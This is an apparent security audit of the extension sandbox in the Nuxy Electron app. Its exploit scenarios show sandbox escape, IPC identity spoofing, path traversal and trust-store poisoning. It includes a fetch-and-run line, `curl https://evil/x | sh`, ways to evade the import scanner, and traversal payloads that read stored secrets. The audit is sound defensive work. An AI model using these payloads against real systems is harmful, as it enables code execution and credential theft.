# Security Audit — `origin/main` (baseline codebase)

- **Date:** 2026-06-26
- **Commit audited:** `origin/main` = `f18d58d` (working tree; the small staged `task/qbit-p0-p1` delta was reviewed separately in [`branch-qbit-p0-p1-review.md`](./branch-qbit-p0-p1-review.md) and does not affect these findings)
- **Method:** four domain-focused review passes (Electron main/privilege boundary, extension sandbox & permission model, network/shell/fs backends, renderer/frontend XSS), followed by manual source verification of every HIGH/MEDIUM candidate against the cited lines.
- **Scope:** `src/electron/**`, `packages/{core,extension-host,extension-sdk}/**`, `extensions/**`, `src/renderer/**`. Excluded: build artifacts (`src/dist*`, `src/release/**`, `**/dist/**`, generated `ui-default/frontend.js`), tests, docs.

---

## Threat model & overall assessment

Nuxy loads third-party **extensions** (a backend Worker thread + a frontend custom element). The codebase clearly **intends** a post-install sandbox: declared `permissions`, a Node-builtin import scan, private vs. public IPC channels, per-extension worker isolation, read-only extracted dirs, and an install-time signature + publisher-trust prompt.

**The primary security boundary that actually holds is the install-time signature + one-time "Trust & Install" prompt** (`verifyAndSecureExtension`, `manifest-loader.ts:221-283`). Electron is also correctly hardened: `sandbox:true`, `contextIsolation:true`, `nodeIntegration:false` (`window/manager.ts:85-87`), and the `contextBridge` surface exposes only namespaced helpers (no raw `ipcRenderer`/`fs`/`child_process`).

**The post-install runtime sandbox is _not_ a reliable boundary.** Once a user approves a malicious or compromised extension, multiple independent bypasses (below) defeat the permission model, the private-channel isolation, the per-extension storage confinement, and the publisher-trust store itself. Several issues are reachable even by a **frontend-only, zero-permission** extension because all extension frontends share one renderer holding `window.core`.

Backend network/subprocess/fs handling (qBittorrent, download-manager, video-downloader, nyaa, ollama, file-transfer, notes, clipboard, angrysearch, calculator) and the renderer XSS surface were audited closely and are **solid** — no findings there (`core.shell.*` is `execFile`/`spawn` with no shell; the renderer uses Lit auto-escaped bindings and a sanitizing `safeHTML`/`safeSVG` with no `innerHTML`/`unsafeHTML` sinks). See "Verified safe."

### Summary

| #   | Severity | Confidence | Finding                                                                                                       | Reachable by                                   |
| --- | -------- | ---------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| 1   | HIGH     | 9          | Permission sandbox not enforced — worker has full Node access; import scan is evadable                        | malicious extension backend                    |
| 2   | HIGH     | 9          | Cross-extension **private**-IPC access via spoofable `callerExtId`                                            | any extension frontend                         |
| 3   | HIGH     | 7          | `nuxy-ext://` path traversal via `..` ext-id → read any file under `~/.nxy`                                   | any extension frontend (incl. zero-permission) |
| 4   | HIGH     | 8          | Unvalidated `manifest.id` → storage traversal into `SECURITY_DIR` → **trust-store poisoning**                 | extension w/ `storage` permission              |
| 5   | MEDIUM   | 8          | `installExtension` kernel channel: unsanitized `extId` → arbitrary file write                                 | any extension frontend                         |
| 6   | MEDIUM   | 8          | Extension install/uninstall unauthorized (`extensions.manage` never enforced; `capabilities` self-declarable) | any extension frontend or backend              |

Plus defense-in-depth notes (§ "Lower-severity / hardening").

---

## HIGH findings

### 1. Declared-permission sandbox is not a runtime boundary — worker RCE; import scan is evadable

- **Category:** sandbox_escape / permission_bypass
- **Confidence:** 9 — **Severity:** HIGH (precondition: a malicious/compromised extension is installed and trusted)
- **Locations:** `src/electron/spawn/spawn.ts:59-67`; `src/electron/extensions/manifest-loader.ts:49-91`, `:414-422`; `packages/extension-host/src/core-proxy.ts:106-112`; `packages/extension-host/src/proxy-shell.ts:22-54`; `packages/extension-host/src/proxy-fs.ts:28-43`; `src/electron/config/permissions.ts:4-14`

**Description.** Extension backends run in a **plain `worker_threads` Worker** with no isolation (`spawn.ts:59` `new Worker(hostScript, { workerData })` — no `execArgv`, no Node permission policy, no SES/`vm`). A worker thread therefore has full native access to `child_process`, `fs`, `net`, `process.binding`, etc.

The only thing nominally restricting that access is **static source analysis**: `detectNodeImports` (`manifest-loader.ts:49-91`) rejects an extension whose source matches `import …'x'` / `require('x')` / `import('x')` where `x` is a **single/double-quoted string literal** (regexes at lines 58, 70, 81). This is trivially evaded:

- template literal: ``await import(`child_process`)`` (backticks are not in the `['"]` class)
- computed/concatenated specifier: `import('child_' + 'process')`, `import(['fs'][0])`
- no import statement at all: `process.binding('spawn_sync')`, `module.createRequire(...)`, `globalThis.process.mainModule?.require(...)`

Separately, capabilities that _are_ declared (`shell`, all `fs` except `fileExists`, `db`, `settings`) are enforced **only inside the worker** by `checkPermission` (`core-proxy.ts:106-112`) and then executed in-worker (`proxy-shell.ts`, `proxy-fs.ts`) — they never round-trip to the trusted main process. The main-side gate `assertHostPermission` (`permissions.ts:24-40`) only covers clipboard/storage/media/`fs.fileExists` (`HOST_CHANNEL_PERMISSION`, `permissions.ts:4-14`); it does **not** list `shell` or the data-bearing `fs` ops. A malicious worker can simply not call `checkPermission` and use Node directly.

**Exploit scenario.** An author ships an extension declaring **no permissions**. Its backend runs ``const cp = await import(`child_process`); cp.execSync('curl https://evil/x | sh')``. The import scan finds nothing; the worker executes arbitrary commands as the user — full RCE despite declaring no `shell`/`fs`. (Even without evasion, declaring `shell` yields `core.shell.exec('sh', ['-c', '…'])`.) The manifest permission list shown to the user is therefore misleading: it does not bound what the backend can do.

**Recommendation.** Do not use static source analysis as an OS-process trust boundary. Enforce a real runtime barrier: run extension backends under Node's Permission Model (`--permission`/`permission.deny`) or SES/`lockdown`, remove `process.binding`/`createRequire` reachability and freeze intrinsics, and broker **all** privileged ops (`shell`, `fs`, `db`) through the main thread with a main-side permission re-check (as clipboard/storage/media already are). At minimum, treat any dynamic `import()`/`require()` with a non-literal specifier as a scan violation — though this remains defense-in-depth, not a boundary.

---

### 2. Cross-extension private-IPC access via spoofable `callerExtId`

- **Category:** authz_bypass
- **Confidence:** 9 — **Severity:** HIGH
- **Locations:** `src/electron/bootstrap/preload.ts:10-18`; `src/electron/ipc/register.ts:22-24`; `src/electron/ipc/validate.ts:107-123`; `packages/extension-sdk/src/invoke-ipc.ts:13-14`

**Description.** The renderer `ext:invoke` path authenticates the caller from a **renderer-supplied** value. The preload forwards `options.callerExtId` verbatim (`preload.ts:16-17`); the `ipcMain.handle('ext:invoke')` handler reads `options?.callerExtId` (`register.ts:22-24`) with **no binding to `_event.sender`** or any per-frontend identity; and `validateExtInvokeArgs` authorizes a **private** channel whenever `callerExtId === id` (`validate.ts:109-122`). Because all extension frontends are third-party code sharing a single renderer context, any frontend can assert any identity.

It is worse than a missing check: the SDK helper **defaults `callerExtId` to the _target_ id** — `callerExtId: callerExtId ?? targetExtId` (`invoke-ipc.ts:13-14`). So the `callerExtId === id` condition is satisfied **by default** for any call, making the "private" classification effectively a no-op against a renderer caller. (The worker→worker broker path is _not_ affected — `broker.ts:65-71` rejects private channels outright and binds the caller id at spawn.)

**Exploit scenario.** A malicious extension's frontend calls `window.core.ipc.invoke('com.victim.ext', '<privateChannel>', payload, { callerExtId: 'com.victim.ext' })`. Validation passes and `invokeWorker` (`register.ts:34`) dispatches to the victim backend's private handler, which runs with the **victim's** permissions and state — a confused-deputy: e.g. driving a victim that holds `fs`/`shell`, mutating/deleting another extension's data (notes `update`/`delete`, etc.), or exfiltrating whatever the private handler returns.

**Recommendation.** Derive caller identity on the trusted side, never from the payload. Bind each mounted tool frontend to its extension id (isolated preload world / per-extension `MessagePort`, or a `_event.sender`(+frame)→extension map) and ignore client-supplied `callerExtId` for authorization. Private channels must never be reachable on a self-asserted id.

---

### 3. `nuxy-ext://` path traversal via `..` ext-id → read any file under `~/.nxy`

- **Category:** path_traversal (information disclosure)
- **Confidence:** 7 (code flaw certain; exploitability depends on Chromium delivering the `..` authority intact) — **Severity:** HIGH
- **Locations:** `src/electron/protocol/resolve.ts:13`, `:88`, `:96-102`, `:120-124`; `src/electron/protocol/register.ts:14-16`, `:118-125`; `src/electron/bootstrap/main.ts:62-68`

**Description.** `nuxy-ext` is registered as a privileged **standard** scheme with `corsEnabled:true`, `bypassCSP:true`, `supportFetchAPI:true` (`main.ts:64-68`), so any extension frontend can `fetch('nuxy-ext://…')`. The handler takes the first URL segment as `extId` (`register.ts:14-16`). The id filter `SAFE_EXT_ID_RE = /^[a-z0-9._-]+$/i` (`resolve.ts:13`) **accepts `..`** (the dot is in the class), so `resolve.ts:88` lets it through. When `..` matches no registered extension, `folderName` falls back to the raw segment (`resolve.ts:91-94`) and `base = path.resolve(EXTRACTED_DIR, '..')` (`resolve.ts:96`) — i.e. the **parent of `EXTRACTED_DIR`, which is `~/.nxy`**. The traversal guard at `resolve.ts:98-102` only checks that `filePath` stays within `base`; it never asserts that `base` stayed within `EXTRACTED_DIR`, so the escape has already happened. JSON files are served as ES modules (`register.ts:118-125`).

**Exploit scenario.** Any extension frontend (including a **frontend-only, zero-permission** one) runs `await (await fetch('nuxy-ext://../data/com.nuxy.settings/settings.json')).text()` → `base = ~/.nxy`, `filePath = data/com.nuxy.settings/settings.json` → serves another extension's stored data, which includes **user-entered secrets** (e.g. the qBittorrent password, OpenAI/Whisper key, etc. under `~/.nxy/data/<ext>/`). The same primitive reads `nuxy-ext://../security/trusted-keys.json` and other `~/.nxy/security/*` files. `bypassCSP` + `Access-Control-Allow-Origin:*` guarantee the fetch is permitted from any frontend.

**Caveat / confidence.** The high-impact variant requires Electron/Chromium to deliver `request.url` with the `..` authority preserved (very likely for a `standard` scheme, but not verified at runtime here). Independent of the URL parser, the shared-folder fallback at `resolve.ts:120-124` already lets any extension read any **file under `EXTRACTED_DIR`** (other extensions' bundled code/manifests/settings schemas) using a perfectly normal ext-id — lower sensitivity, but confirms the confinement is too loose.

**Recommendation.** Reject `.`, `..`, and path separators in `extId` before any path math (e.g. `/^[a-z0-9][a-z0-9._-]*$/` plus an explicit `extId !== '.' && extId !== '..'`), and after computing `base` assert `!path.relative(EXTRACTED_DIR, base).startsWith('..')`. Consider scoping the shared-folder fallback to an explicit allowlist of shared files.

---

### 4. Unvalidated `manifest.id` → storage traversal into `SECURITY_DIR` → trust-store poisoning

- **Category:** path_traversal → privilege_escalation / persistence
- **Confidence:** 8 — **Severity:** HIGH (precondition: one malicious extension with `storage` permission is installed and trusted)
- **Locations:** `src/electron/extensions/manifest-loader.ts:392-405`, `:424-435` (no id validation); `src/electron/spawn/migrate-data.ts:8-10`; `src/electron/spawn/host-handlers.ts:113-141`; `src/electron/config/storage-path.ts:4-12`; `src/electron/security/security.ts:10`, `:85-102`, `:107-119`; `src/electron/extensions/manifest-loader.ts:249-253`

**Description.** Manifest loading validates `permissions` and `deeplinks` but **never validates `manifest.id`** (`manifest-loader.ts:392-422`); the id is taken verbatim (`:424` `extId = manifest.id || folderName`) and the extension is registered under it. Storage host calls compute the data dir from that id: `extensionDataDir(extId) = path.join(DATA_DIR, extId)` (`migrate-data.ts:8-10`), then `resolveStoragePath(dataDir, file)` (`host-handlers.ts:117/136-139`). `resolveStoragePath` correctly confines the _file_ within `dataDir` (`storage-path.ts:4-12`) — but the traversal is in `dataDir` itself: with `extId = '../security'`, `path.join('~/.nxy/data', '../security') = ~/.nxy/security`, fully inside the guard.

The publisher trust store `~/.nxy/security/trusted-keys.json` is a **plain JSON array of PEM strings** (`security.ts:10`, `getTrustedKeys` `:85-94`, `isKeyTrusted` `:99-102`), and `core.storage.write` serializes arbitrary JSON to `<dataDir>/<file>` (`host-handlers.ts:139`). So the attacker fully controls its contents.

**Exploit scenario.** Attacker publishes an extension with `"id": "../security"`, a backend, and the default `storage` permission. After the user approves its one-time trust prompt, the backend calls `core.storage.write('trusted-keys.json', ['<attacker publisher PEM>'])` → writes `~/.nxy/security/trusted-keys.json`, injecting the attacker's key into the trust anchor. From then on, `isKeyTrusted` returns true for anything that attacker signs, so `verifyAndSecureExtension` **skips the trust prompt** (`manifest-loader.ts:249-253`) and the attacker's future extensions install **silently**. The same primitive can read/overwrite sibling extensions' data and other `security/` files (revocation list, state secret).

**Recommendation.** Validate `manifest.id` at load against a strict charset that forbids `.`/`..`/`/`/`\` and reject otherwise. Defense-in-depth: in `extensionDataDir`, assert `!path.relative(DATA_DIR, dataDir).startsWith('..')`; keep `SECURITY_DIR` outside any extension-derived path space.

---

## MEDIUM findings

### 5. `installExtension` kernel channel: unsanitized `extId` → arbitrary file write

- **Category:** path_traversal / arbitrary_file_write
- **Confidence:** 8 — **Severity:** MEDIUM
- **Locations:** `src/electron/ipc/validate.ts:22`, `:60-81`; `src/electron/ipc/kernel-invokable.ts:16-24`; `src/electron/ipc/extension-ops.ts:14-29`

**Description.** `installExtension` is in `KERNEL_CHANNELS` (`validate.ts:22`) and the kernel branch of `validateExtInvokeArgs` (`validate.ts:60-81`) places **no restriction on which caller** may invoke kernel channels from the renderer. The handler validates only that `extId`/`downloadUrl` are non-empty strings (`kernel-invokable.ts:20`), then `fetch(downloadUrl)` and writes the bytes to `path.join(EXTENSION_DIR, `${extId}.nuxyext`)` (`extension-ops.ts:25-29`). A `..`-laden `extId` escapes `EXTENSION_DIR`; `downloadUrl` is a fully attacker-controlled fetch (host + protocol).

**Exploit scenario.** Any extension frontend (zero permissions) calls `window.core.ipc.invoke('kernel','installExtension',{ extId:'../../../../tmp/evil', downloadUrl:'http://attacker/x' })`. The main process fetches attacker bytes and writes them to a path outside `EXTENSION_DIR` (constrained to a forced `.nuxyext` suffix). Impact: drop/overwrite files under predictable paths and stage a `.nuxyext` that the immediately-scheduled `invokeRescan()` (`extension-ops.ts:30`) picks up (still gated by signature+trust before activation). Exact traversal payloads require arithmetic around the `.tmp_` temp-name prefix, but the unsanitized-path write primitive is real.

**Recommendation.** Validate `extId` against the strict id charset before any `path.join`, and assert the temp and destination paths resolve inside `EXTENSION_DIR`. Consider restricting `installExtension`/`uninstallExtension` to a trusted principal (see #6).

---

### 6. Extension install/uninstall is unauthorized — `extensions.manage` never enforced, `capabilities` self-declarable

- **Category:** authz_bypass / missing_authorization
- **Confidence:** 8 — **Severity:** MEDIUM
- **Locations:** `src/electron/extensions/manifest-loader.ts:396-405` (validates `permissions` only — never `capabilities`); `src/electron/ipc/broker.ts:21-36`; `src/electron/ipc/kernel-invokable.ts:11-34`; `src/electron/ipc/extension-ops.ts:38-75`; `src/electron/ipc/validate.ts:22-23`, `:60-81`. `extensions.manage` is declared (`manifest-loader.ts:41`) but enforced **nowhere** (grep confirms only the allowlist entry + the settings manifest declaration).

**Description.** Two unauthorized reach paths to extension management:

1. **Renderer path:** `installExtension`/`uninstallExtension` are kernel channels callable by any extension frontend with no caller restriction (`validate.ts:60-81`).
2. **Backend path:** `core.extensions.invoke('kernel', …)` routes through `invokeExtension`, gated only by `caller.manifest.capabilities?.caller` (`broker.ts:21-27`) — and **`capabilities` is never validated at manifest load**, so any extension can self-grant `"capabilities": { "caller": true }`. The kernel branch then calls `callKernelChannel` with **no `extensions.manage` check** (`broker.ts:30-36`, `kernel-invokable.ts:16-33`).

`kernelUninstallExtension` only protects `com.nuxy.shell`/`com.nuxy.settings`/bootstrap extensions (`extension-ops.ts:39-48`).

**Exploit scenario.** A malicious extension (frontend or backend) calls `uninstallExtension({ extId: 'com.othervendor.security' })` to delete an arbitrary non-system peer (integrity/availability tampering), or `installExtension` to drive #5. No permission or capability that the user can see actually gates this.

**Recommendation.** Validate `capabilities` against an allowlist at manifest load (and restrict `caller`/`callable` to signed/first-party extensions). Enforce `extensions.manage` in `callKernelChannel`/`invokeExtension` and on the renderer kernel path before honoring `installExtension`/`uninstallExtension`.

---

## Lower-severity / hardening (below the independent-exploit bar)

- **`proxy-settings` cross-extension traversal** — `packages/extension-host/src/proxy-settings.ts:7-9`: `getTargetExtDir(targetExtId)` does `path.join(base, targetExtId)` with an unvalidated id; `../…` escapes the data root (limited to a fixed `ext-settings.json` filename; gated worker-side by `settings.read`/`settings.write`). Confine like `resolveStoragePath`.
- **Clipboard-image host calls skip the trusted-side permission check** — `permissions.ts:4-14` omits `CLIPBOARD_READ_IMAGE`/`CLIPBOARD_WRITE_IMAGE`, so `assertHostPermission` returns `null` (allowed) for them (`host-handlers.ts:72-87`). Not independently reachable without forging a `host:call` (needs #1), but add them to the map.
- **No navigation guards** — there is no `will-navigate` or `setWindowOpenHandler` anywhere in `src/electron` (grep empty). Because the preload re-attaches `window.core` on every navigation, renderer JS that navigates the window to a remote origin would hand that origin the privileged bridge. Contained today by `sandbox:true` and the need to already control renderer JS — add both guards to pin navigation to the local app origin.
- **Markdown link scheme not validated** — `extensions/ui-default/src/components/MarkdownText/render-markdown.ts:26` sets `a.href` from `[text](href)` without a scheme allowlist; mitigated by `target="_blank"` (Chromium blocks `javascript:` to a new browsing context). Add an `http(s)|mailto|magnet` allowlist as defense-in-depth.

---

## Verified safe (high-risk areas checked and found sound)

- **Electron hardening:** `window/manager.ts:85-87` — `nodeIntegration:false`, `contextIsolation:true`, `sandbox:true`; no `enableRemoteModule`/`webviewTag`/`allowRunningInsecureContent`. `preload.ts` exposes only namespaced helpers — no raw `ipcRenderer`/`fs`/`child_process`.
- **Backend subprocess sinks:** `core.shell.open/exec/spawn` use `execFile`/`spawn` with **no shell** (`proxy-shell.ts`) — no metacharacter or argument-splitting injection. download-manager (`curl -fL -o <fixed path>`, http/https-validated URL), video-downloader (yt-dlp execFile, fixed output template), nyaa (fixed host `nyaa.si`, `encodeURIComponent` query, `\d+` id), angrysearch (parameterized SQL), ollama (user-owned host), file-transfer (sanitized peer filename), calculator (recursive-descent parser, no `eval`) — all traced to safe sinks.
- **Renderer XSS:** no `innerHTML`/`unsafeHTML`/`insertAdjacentHTML`/`document.write`/`eval` on untrusted data anywhere in non-generated source. Untrusted strings (torrent names, model output, notes, clipboard, IPC payloads, nyaa titles) render via Lit auto-escaped `${}`/`.prop=` bindings; raw icon/theme SVG goes through the sanitizing `safeHTML`/`safeSVG` (`packages/core/src/lit.ts`) which strips `on*`/`javascript:`/`script`.
- **Correct IPC enforcement (contrast #2):** the worker→worker broker (`broker.ts:63-71`) binds caller id at spawn and rejects private channels; public-channel registration cannot exceed the manifest (`validateIpcSync`, `spawn.ts:75-87`).
- **Storage file confinement (contrast #4):** `resolveStoragePath` (`storage-path.ts`) correctly blocks `..`/absolute in the _file_ argument — the gap is the ext-id-derived `dataDir`.
- **Install trust pipeline:** signature verification + integrity + revocation + publisher-trust prompt + read-only extracted dirs (`security.ts`, `manifest-loader.ts:221-283`) is the boundary that holds; dev bridges are `import.meta.env.DEV`-gated (dead-code-eliminated from packaged builds).
- **Deeplink handling:** WHATWG `URL`, validated against the live registry, forwarded only as a `deeplink:open` event — no `exec`/navigation/arg-injection.

---

## Prioritized recommendations

1. **Decide the extension trust model and make it consistent.** Either (a) document that installed extensions are fully trusted and stop implying a permission sandbox, or (b) make the runtime boundary real: run backends under Node's Permission Model / SES, broker all `shell`/`fs`/`db` with main-side re-checks (fixes #1).
2. **Authenticate IPC caller identity on the trusted side** — ignore renderer-supplied `callerExtId`; bind per-frontend identity (fixes #2, and the renderer reach in #5/#6).
3. **Centralize ext-id / manifest-id validation** (strict charset, no `.`/`..`/separators) and assert path confinement in every `path.join(<root>, id)` site — protocol resolve, `extensionDataDir`, `getTargetExtDir`, `installExtension` (fixes #3, #4, #5, and the proxy-settings note).
4. **Validate `capabilities` at manifest load and enforce `extensions.manage`** on install/uninstall (fixes #6).
5. Add `will-navigate`/`setWindowOpenHandler` guards and a markdown-href scheme allowlist (hardening).
